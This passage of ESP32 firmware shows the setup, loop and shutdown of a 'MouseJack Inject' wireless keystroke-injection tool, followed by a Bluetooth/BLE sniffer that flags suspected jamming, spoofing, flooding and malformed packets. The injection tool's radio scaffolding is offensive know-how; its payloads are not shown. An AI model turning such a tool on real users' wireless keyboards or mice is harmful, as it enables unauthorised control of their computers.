    s_logColor[i] = UI_DIM_TEXT;
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < kInjStatusLines; i++) {
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kInjMaxTargets; i++) s_targets[i].used = false;

  injImportShared();
  s_targetIndex = 0;

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();

  runUI();
  injDrawTextBoxes();
  injAppendLog("[+] MouseJack Inject ready", UI_WARN);
  if (s_targetCount > 0) {
    injAppendLog(String("[*] Imported ") + String(s_targetCount) + " from scanner", UI_OK);
  } else {
    injAppendLog("[*] Fire/Scan to find targets", UI_DIM_TEXT);
  }
  s_statusDirty = true;
  injFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();
  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);
  injInitSpi();
  injDisable();
  injPowerUp();
  redrawTouchButtonBar();
}

void mouseJackInjectLoop() {
  s_active = true;
  while (s_active) {
    if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      s_active = false;
      break;
    }
    injHandleNavButtons();
    maintainTouchNavBar();
    runUI();
    if (s_scanning) injScanStep();
    injFlushUi(false);
    delay(1);
  }
}

void exit() {
  s_active = false;
  s_scanning = false;
  s_injecting = false;
  injDisable();
  injSetRegister(_INJ_STATUS, 0x70);
  injFlushRx();
  injFlushTx();
  injPowerDown();
  injSetRegister(_INJ_STATUS, 0x70);
  digitalWrite(CSN, HIGH);
  delayMicroseconds(40);
  releaseSharedSpiWithoutSdMount();
}

}  // namespace MouseJackInject

namespace BleSniffer {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 20
#define ICON_SIZE 16
#define ICON_NUM 3

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {170, 210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_eye2,
  bitmap_icon_go_back
};

#define HEADER_HEIGHT 20
#define STATUS_DOT_SIZE 8
#define LINE_HEIGHT 16
#define MAX_LINES 16
#define MAX_DEVICES 32
#define SCAN_INTERVAL 5000
#define MAX_LINE_LENGTH 38
#define BEACON_PREFIX "4c000215"
#define ALERT_FLASH_DURATION 1000
#define SEPARATOR_THICKNESS 1
#define SEPARATOR_MARGIN 5
#define Y_OFFSET 37

struct Config {
  static constexpr int tftRotation = 0;
  static constexpr int serialBaud = 115200;
  static constexpr int bleScanDuration = 5;
  static constexpr int btScanDuration = 5;
  static constexpr int maxPacketCount = 20;
  static constexpr int minRssiThreshold = -20;
  static constexpr int maxNewDevices = 20;
  static constexpr int maxMfgDataLength = 31;
  static constexpr unsigned long deviceTimeout = 30000;
  static constexpr int maxRandomizedMacChanges = 5;
};

enum class MessageType {
  DEVICE,
  ALERT,
  STATUS
};

struct DeviceInfo {
  String mac;
  int rssi = 0;
  int packetCount = 0;
  bool isSuspicious = false;
  String deviceName;
  String serviceUUID;
  String beaconUUID;
  unsigned long lastSeen = 0;
  bool display = true;
  bool jammingAlerted = false;
  bool isBLE = true;
  int macChangeCount = 0;
};

struct DisplayLine {
  String text;
  uint16_t color = GREEN;
  uint16_t originalColor = GREEN;
  bool isAlert = false;
  unsigned long flashUntil = 0;
  MessageType type = MessageType::DEVICE;
};

class BluetoothSniffer {
private:
  DeviceInfo devices[MAX_DEVICES];
  DisplayLine displayLines[MAX_LINES];
  int deviceCount = 0;
  int lineNumber = 1;
  int suspiciousCount = 0;
  int newDevicesThisScan = 0;
  int lastDeviceCount = -1;
  int lastSuspiciousCount = -1;
  bool scanning = true;
  bool isBLEScanActive = true;
  unsigned long lastScanTime = 0;
  unsigned long lastFlashToggle = 0;
  bool flashState = false;
  BLEScan* pBLEScan = nullptr;
  BLEAdvertisedDeviceCallbacks* bleDeviceCallbacks = nullptr;
  static BluetoothSniffer* snifferInstance;

  void releaseBleCallbacks() {
    if (pBLEScan) {
      pBLEScan->stop();
      pBLEScan->setAdvertisedDeviceCallbacks(nullptr);
    }
    delete bleDeviceCallbacks;
    bleDeviceCallbacks = nullptr;
  }

  static int snifferContentTop() {
    return Y_OFFSET + HEADER_HEIGHT;
  }

  static int snifferVisibleLines() {
    return bleMaxLinesInZone(snifferContentTop(), LINE_HEIGHT);
  }

  static bool snifferLineFits(int lineIndex) {
    const int y = snifferContentTop() + (lineIndex * LINE_HEIGHT);
    return y + LINE_HEIGHT <= bleContentBottom();
  }

  void initDisplay() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
    runUI();

    setupTouchscreen();
    {
      const int bodyH = bleContentBottom() - 37;
      if (bodyH > 0) {
        tft.fillRect(0, 37, 240, bodyH, TFT_BLACK);
      }
    }
    tft.setTextSize(1);
    updateHeader();

  }

  void updateHeader() {
    if (!scanning) return;
    tft.fillRect(0, Y_OFFSET, tft.width(), HEADER_HEIGHT, DARK_GRAY);
    tft.setTextColor(WHITE, DARK_GRAY);
    tft.setCursor(5, Y_OFFSET + 6);
    String status = isBLEScanActive ? "BLE Scanning" : "BT Scanning";
    tft.print(status + " | Dev: " + String(deviceCount) + " Sus: " + String(suspiciousCount));
    uint16_t dotColor = isBLEScanActive ? BLUE : GREEN;
    tft.fillCircle(tft.width() - 10, 46, STATUS_DOT_SIZE / 2, dotColor);
    tft.drawFastHLine(0, 56, 240, UI_LINE);
  }

  void updateDisplay() {
    if (!scanning) return;
    unsigned long now = millis();
    if (now - lastFlashToggle >= 500) {
      flashState = !flashState;
      lastFlashToggle = now;
    }
    {
      const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
      const int bodyH = bleContentBottom() - bodyTop;
      if (bodyH > 0) {
        tft.fillRect(0, bodyTop, tft.width(), bodyH, TFT_BLACK);
      }
    }
    const int visibleLines = snifferVisibleLines();
    for (int i = 0; i < visibleLines; i++) {
      if (displayLines[i].text.isEmpty()) continue;
      if (!snifferLineFits(i)) continue;
      int y = snifferContentTop() + (i * LINE_HEIGHT);
      uint16_t textColor = displayLines[i].originalColor;
      if (displayLines[i].isAlert && displayLines[i].flashUntil > now) {
        textColor = flashState ? displayLines[i].originalColor : TFT_BLACK;
      }
      tft.setTextColor(textColor, TFT_BLACK);
      tft.setCursor(5, y + 2);
      tft.print(displayLines[i].text);
      if (displayLines[i].originalColor == ORANGE && !displayLines[i].isAlert) {
        tft.drawRect(3, y, tft.width() - 6, LINE_HEIGHT - 2, ORANGE);
      }
      if (i < visibleLines - 1 && !displayLines[i + 1].text.isEmpty() &&
          displayLines[i].type != displayLines[i + 1].type && snifferLineFits(i + 1)) {
        int separatorY = y + LINE_HEIGHT - 1;
        tft.drawFastHLine(SEPARATOR_MARGIN, separatorY, tft.width() - 2 * SEPARATOR_MARGIN, DARK_GRAY);
      }
    }
    if (deviceCount != lastDeviceCount || suspiciousCount != lastSuspiciousCount) {
      updateHeader();
      lastDeviceCount = deviceCount;
      lastSuspiciousCount = suspiciousCount;
    }
    if (deviceCount == 0 && lineNumber == 1) {
      tft.setTextColor(GREEN, TFT_BLACK);
      tft.setCursor(5, snifferContentTop() + 10);
    }
  }

  void addLine(String text, uint16_t color, bool isAlert = false, MessageType type = MessageType::DEVICE) {
    if (!scanning) return;
    if (text.length() > MAX_LINE_LENGTH) {
      text = text.substring(0, MAX_LINE_LENGTH - 3) + "...";
    }
    const int visibleLines = snifferVisibleLines();
    for (int i = visibleLines - 1; i > 0; i--) {
      displayLines[i] = displayLines[i - 1];
    }
    for (int i = visibleLines; i < MAX_LINES; i++) {
      displayLines[i].text = "";
    }
    displayLines[0].text = text;
    displayLines[0].color = color;
    displayLines[0].originalColor = (type == MessageType::STATUS) ? UI_DIM_TEXT : color;
    displayLines[0].isAlert = isAlert;
    displayLines[0].flashUntil = isAlert ? millis() + ALERT_FLASH_DURATION : 0;
    displayLines[0].type = type;
    updateDisplay();
  }

  void checkSuspiciousActivity(int idx, unsigned long timestamp) {
    auto& device = devices[idx];
    if (device.packetCount > Config::maxPacketCount || (device.isBLE && device.rssi > Config::minRssiThreshold)) {
      if (!device.isSuspicious) {
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display && !device.jammingAlerted) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Jamming Suspected (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
          device.jammingAlerted = true;
        }
      }
    }
    if (device.isBLE && isRandomizedMac(device.mac) && device.macChangeCount > Config::maxRandomizedMacChanges) {
      device.isSuspicious = true;
      suspiciousCount++;
      if (device.display) {
        addLine(String(lineNumber++) + " -> MAC Spoofing Suspected (BLE): " + device.mac + " T:" + String(timestamp),
                ORANGE, true, MessageType::ALERT);
      }
    }
  }

  bool isRandomizedMac(const String& mac) {
    String firstByte = mac.substring(0, 2);
    char* end;
    long value = strtol(firstByte.c_str(), &end, 16);
    return (value & 0xC0) == 0xC0;
  }

  void processNewDevice(BLEAdvertisedDevice* bleDevice, esp_bt_gap_cb_param_t* btDevice, unsigned long timestamp, bool isBLE) {
    if (deviceCount >= MAX_DEVICES) {
      addLine("Max devices reached!", RED, true, MessageType::ALERT);
      return;
    }
    newDevicesThisScan++;
    auto& device = devices[deviceCount];
    device.isBLE = isBLE;
    if (isBLE) {
      device.mac = bleDevice->getAddress().toString().c_str();
      device.rssi = bleDevice->getRSSI();
      device.deviceName = bleDevice->getName().c_str();
      device.serviceUUID = bleDevice->getServiceUUID().toString().c_str();
      String mfgData = bleDevice->getManufacturerData().c_str();
      checkBeaconSpoofing(device, mfgData, timestamp);
      checkMalformedPacket(device, mfgData, timestamp);
    } else {
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               btDevice->disc_res.bda[0], btDevice->disc_res.bda[1], btDevice->disc_res.bda[2],
               btDevice->disc_res.bda[3], btDevice->disc_res.bda[4], btDevice->disc_res.bda[5]);
      device.mac = macStr;
      device.rssi = 0;
    }
    device.packetCount = 1;
    device.lastSeen = timestamp;
    device.display = true;
    checkMacSpoofing(device, timestamp);
    checkSuspiciousActivity(deviceCount, timestamp);
    if (device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      String line = String(lineNumber++) + " -> " + device.mac + " (" + String(device.rssi) + " dBm, " + protocol + ")";
      if (isBLE && !device.deviceName.isEmpty()) line += " N:" + device.deviceName.substring(0, 6);
      if (isBLE && !device.serviceUUID.isEmpty()) line += " U:" + device.serviceUUID.substring(0, 8);
      line += " T:" + String(timestamp).substring(0, 6);
      addLine(line, device.isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
    }
    deviceCount++;
    if (newDevicesThisScan > Config::maxNewDevices && device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      addLine(String(lineNumber++) + " -> Flooding Detected (" + protocol + ") T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkBeaconSpoofing(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || !mfgData.startsWith(BEACON_PREFIX)) return;
    device.beaconUUID = mfgData.substring(4, 36);
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].beaconUUID == device.beaconUUID && devices[i].mac != device.mac) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          addLine(String(lineNumber++) + " -> Beacon Spoofing (BLE): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void checkMalformedPacket(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || mfgData.length() <= Config::maxMfgDataLength) return;
    device.isSuspicious = true;
    suspiciousCount++;
    if (device.display) {
      addLine(String(lineNumber++) + " -> Malformed Packet (BLE): " + device.mac + " T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkMacSpoofing(DeviceInfo& device, unsigned long timestamp) {
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].mac == device.mac && i != deviceCount) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Possible Spoofing (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void cleanupDevices(unsigned long timestamp) {
    for (int i = 0; i < deviceCount; ) {
      if (timestamp - devices[i].lastSeen > Config::deviceTimeout) {
        if (devices[i].isSuspicious) suspiciousCount--;
        for (int j = i; j < deviceCount - 1; j++) {
          devices[j] = devices[j + 1];
        }
        deviceCount--;
      } else {
        i++;
      }
    }
  }

  void filterByMac(const String& filterMac) {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = (devices[i].mac == filterMac);
    }
    refreshDisplay();
  }

  void filterSuspicious() {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = devices[i].isSuspicious;
    }
    refreshDisplay();
  }

  void refreshDisplay() {
    for (int i = 0; i < MAX_LINES; i++) {
      displayLines[i].text = "";
      displayLines[i].color = GREEN;
      displayLines[i].originalColor = GREEN;
      displayLines[i].isAlert = false;
      displayLines[i].flashUntil = 0;
      displayLines[i].type = MessageType::DEVICE;
    }
    lineNumber = 1;
    {
      const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
      const int bodyH = bleContentBottom() - bodyTop;
      if (bodyH > 0) {
        tft.fillRect(0, bodyTop, tft.width(), bodyH, TFT_BLACK);
      }
    }
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].display) {
        String protocol = devices[i].isBLE ? "BLE" : "BT";
        String line = String(lineNumber++) + " -> " + devices[i].mac + " (" + String(devices[i].rssi) + " dBm, " + protocol + ")";
        if (devices[i].isBLE && !devices[i].deviceName.isEmpty()) line += " N:" + devices[i].deviceName.substring(0, 6);
        if (devices[i].isBLE && !devices[i].serviceUUID.isEmpty()) line += " U:" + devices[i].serviceUUID.substring(0, 8);
        line += " T:" + String(devices[i].lastSeen).substring(0, 6);
        addLine(line, devices[i].isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
      }
    }
  }

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, 40, 240, UI_LINE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        drawToolbarIcon(iconX[i], iconY, icons[i], TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= TOOLBAR_ANIMATION_MS) {
    if (animationState == 1) {
      drawToolbarIcon(iconX[activeIcon], iconY, icons[activeIcon], TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
            deviceCount = 0;
            suspiciousCount = 0;
            lastDeviceCount = -1;
            lastSuspiciousCount = -1;
            lineNumber = 1;
            for (int i = 0; i < MAX_LINES; i++) {
              displayLines[i].text = "";
              displayLines[i].color = GREEN;
              displayLines[i].originalColor = GREEN;
              displayLines[i].isAlert = false;
              displayLines[i].flashUntil = 0;
              displayLines[i].type = MessageType::DEVICE;
            }
            refreshDisplay();
            addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
          break;
        case 1:
           filterSuspicious();
          break;
        case 2:
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  static bool s_headerTouchHeld = false;
  const unsigned long touchCheckInterval = 25;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x = 0;
    int y = 0;
    int hitIcon = -1;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            if (icons[i] != NULL && animationState == 0) {
              hitIcon = i;
            }
            break;
          }
        }
      }
    }
    if (hitIcon >= 0) {
      if (!s_headerTouchHeld) {
        if (hitIcon == 2) {
          feature_exit_requested = true;
        } else {
          drawToolbarIcon(iconX[hitIcon], iconY, icons[hitIcon], TFT_BLACK);
          animationState = 1;
          activeIcon = hitIcon;
          lastAnimationTime = millis();
        }
      }
      s_headerTouchHeld = true;
    } else {
      s_headerTouchHeld = false;
    }
    lastTouchCheck = millis();
  }
}

public:
  void setup() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    runUI();

    setupTouchscreen();

    initDisplay();

    releaseBleCallbacks();
    ensureBleStackReady();
    pBLEScan = BLEDevice::getScan();
    bleDeviceCallbacks = new AdvertisedDeviceCallbacks(*this);
    pBLEScan->setAdvertisedDeviceCallbacks(bleDeviceCallbacks);
    pBLEScan->setActiveScan(true);
    scanning = true;

    addLine("Bluetooth Sniffer Ready", DARK_GRAY, true, MessageType::STATUS);
    startBLEScan();
  }

  void loop() {
    if (feature_exit_requested || featureExitButtonPressed()) {
      feature_exit_requested = true;
      return;
    }

    unsigned long now = millis();
    tft.drawFastHLine(0, 19, 240, UI_LINE);

    runUI();
    if (feature_exit_requested || featureExitButtonPressed()) {
      feature_exit_requested = true;
      return;
    }
    updateStatusBar();
    cleanupDevices(now);
    if (scanning && now - lastScanTime >= SCAN_INTERVAL) {
      if (isBLEScanActive) {
        pBLEScan->stop();
        startBTScan();
        isBLEScanActive = false;
      } else {

        startBLEScan();
        isBLEScanActive = true;
      }
      lastScanTime = now;
    }
    if (Serial.available()) {
      String input = Serial.readStringUntil('\n');
      input.trim();
      if (input.startsWith("FILTER MAC ")) {
        filterByMac(input.substring(11));
      } else if (input == "FILTER SUSPICIOUS") {
        filterSuspicious();
      } else if (input == "RESET") {
        deviceCount = 0;
        suspiciousCount = 0;
        lastDeviceCount = -1;
        lastSuspiciousCount = -1;
        lineNumber = 1;
        for (int i = 0; i < MAX_LINES; i++) {
          displayLines[i].text = "";
          displayLines[i].color = GREEN;
          displayLines[i].originalColor = GREEN;
          displayLines[i].isAlert = false;
          displayLines[i].flashUntil = 0;
          displayLines[i].type = MessageType::DEVICE;
        }
        refreshDisplay();
        addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
      }
    }
  }

  class AdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    BluetoothSniffer& sniffer;
  public:
    AdvertisedDeviceCallbacks(BluetoothSniffer& s) : sniffer(s) {}
    void onResult(BLEAdvertisedDevice* advertisedDevice) override {
      if (!sniffer.scanning) return;
      String mac = advertisedDevice->getAddress().toString().c_str();
      int rssi = advertisedDevice->getRSSI();
      unsigned long timestamp = millis();
      int idx = -1;
      for (int i = 0; i < sniffer.deviceCount; i++) {
        if (sniffer.devices[i].mac == mac && sniffer.devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        sniffer.devices[idx].rssi = rssi;
        sniffer.devices[idx].packetCount++;
        sniffer.devices[idx].lastSeen = timestamp;
        if (sniffer.isRandomizedMac(mac)) {
          sniffer.devices[idx].macChangeCount++;
        }
        sniffer.checkSuspiciousActivity(idx, timestamp);
      } else {
        sniffer.processNewDevice(advertisedDevice, nullptr, timestamp, true);
      }
    }
  };

  static void btCallback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    if (!snifferInstance) return;
    if (event == ESP_BT_GAP_DISC_RES_EVT) {
      unsigned long timestamp = millis();
      int idx = -1;
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
               param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);
      String mac = macStr;
      for (int i = 0; i < snifferInstance->deviceCount; i++) {
        if (snifferInstance->devices[i].mac == mac && !snifferInstance->devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        snifferInstance->devices[idx].packetCount++;
        snifferInstance->devices[idx].lastSeen = timestamp;
        snifferInstance->checkSuspiciousActivity(idx, timestamp);
      } else {
        snifferInstance->processNewDevice(nullptr, param, timestamp, false);
      }
    }
  }

  void startBLEScan() {
    newDevicesThisScan = 0;
    constexpr int kScanChunkSec = 1;
    for (int elapsed = 0; elapsed < Config::bleScanDuration; elapsed += kScanChunkSec) {
      if (feature_exit_requested || featureExitButtonPressed()) {
        feature_exit_requested = true;
        if (pBLEScan) {
          pBLEScan->stop();
        }
        return;
      }
      pBLEScan->start(kScanChunkSec, false);
    }
    addLine("BLE Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void startBTScan() {
    newDevicesThisScan = 0;

    addLine("Classic BT Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void setSnifferInstance() {
    snifferInstance = this;
  }

  void stop() {
    scanning = false;
    snifferInstance = nullptr;
    releaseBleCallbacks();
  }
};

BluetoothSniffer* BluetoothSniffer::snifferInstance = nullptr;
BluetoothSniffer sniffer;

void blesnifferSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleSetExitOnlyNavLabels();
  bleClearBody(TFT_BLACK);
  {
    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
  }
  redrawTouchButtonBar();
  {
    const int bodyH = bleContentBottom() - 37;
    if (bodyH > 0) {
      tft.fillRect(0, 37, 240, bodyH, TFT_BLACK);
    }
  }
  sniffer.setup();
  sniffer.setSnifferInstance();
  redrawTouchButtonBar();
}

void blesnifferLoop() {

  if (feature_active && featureExitButtonPressed()) {
    feature_exit_requested = true;
    return;
  }

  sniffer.loop();
}

void exit() {

  sniffer.stop();
}
}
